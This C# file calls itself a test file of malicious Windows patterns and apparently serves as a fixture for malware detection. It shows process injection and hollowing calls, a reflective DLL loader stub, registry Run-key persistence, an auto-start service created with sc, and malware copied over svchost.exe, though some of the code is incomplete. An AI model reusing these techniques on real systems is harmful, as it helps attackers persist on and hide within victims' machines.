using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

// Windows C# malicious patterns test file

namespace MaliciousTest
{
    class Program
    {
        // ===== PROCESS INJECTION =====
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
        
        [DllImport("ntdll.dll")]
        static extern int NtCreateThreadEx(out IntPtr hThread, uint dwDesiredAccess, IntPtr lpThreadAttributes, IntPtr hProcess, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint dwStackSize, uint dwSizeOfStackReserve, uint dwSizeOfStackCommit, IntPtr lpBytesBuffer);
        
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, IntPtr lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("ntdll.dll")]
        static extern IntPtr RtlCreateUserThread(IntPtr ProcessHandle, IntPtr SecurityDescriptor, bool CreateSuspended, uint StackZeroBits, IntPtr StackReserved, IntPtr StackCommit, IntPtr StartAddress, IntPtr StartParameter, out IntPtr ThreadHandle, IntPtr ClientId);

        // ===== PROCESS HOLLOWING =====
        [DllImport("ntdll.dll")]
        static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
        
        [DllImport("ntdll.dll")]
        static extern int ZwUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        // ===== REFLECTIVE DLL LOADING =====
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        
        delegate bool DllMain(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);
        
        static void ReflectiveLoader()
        {
            // Reflective DLL loading
            byte[] dllBytes = System.IO.File.ReadAllBytes("C:\\malware.dll");
            IntPtr dllBase = VirtualAlloc(IntPtr.Zero, (uint)dllBytes.Length, 0x3000, 0x40);
            Marshal.Copy(dllBytes, 0, dllBase, dllBytes.Length);
            IntPtr reflectiveLoader = GetProcAddress(dllBase, "ReflectiveLoader");
            IntPtr dllMain = GetProcAddress(dllBase, "DllMain");
        }

        // ===== WINDOWS REGISTRY MANIPULATION =====
        static void RegistryPersistence()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("UpdateService", "C:\\malware.exe");
            
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Backdoor", "C:\\backdoor.exe");
        }

        // ===== WINDOWS SERVICE INSTALLATION =====
        static void InstallService()
        {
            Process.Start("sc", "create SystemService binPath= C:\\malware\\service.exe start= auto");
            // ServiceController usage
            System.ServiceProcess.ServiceController sc = new System.ServiceProcess.ServiceController("SystemService");
        }

        // ===== PROCESS MASQUERADING =====
        static void ProcessMasquerading()
        {
            // Rename malware to look like legitimate process
            System.IO.File.Copy("C:\\malware.exe", "C:\\Windows\\System32\\svchost.exe", true);
            Process.Start("C:\\Windows\\System32\\svchost.exe", "malicious payload");
            
            // Masquerade as explorer.exe
            Process.Start("C:\\backdoor.exe", "explorer.exe payload");
        }

        static void Main(string[] args)
        {
            // Process injection example
            IntPtr hProcess = Process.GetProcessById(1234).Handle;
            IntPtr lpBaseAddress = VirtualAllocEx(hProcess, IntPtr.Zero, 1024, 0x3000, 0x40);
            byte[] shellcode = new byte[] { 0x90, 0x90, 0x90 };
            WriteProcessMemory(hProcess, lpBaseAddress, shellcode, (uint)shellcode.Length, out UIntPtr bytesWritten);
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpBaseAddress, IntPtr.Zero, 0, out IntPtr hThread);
            
            // Process hollowing
            NtUnmapViewOfSection(hProcess, lpBaseAddress);
            ZwUnmapViewOfSection(hProcess, lpBaseAddress);
            
            RegistryPersistence();
            InstallService();
            ProcessMasquerading();
        }
    }
}

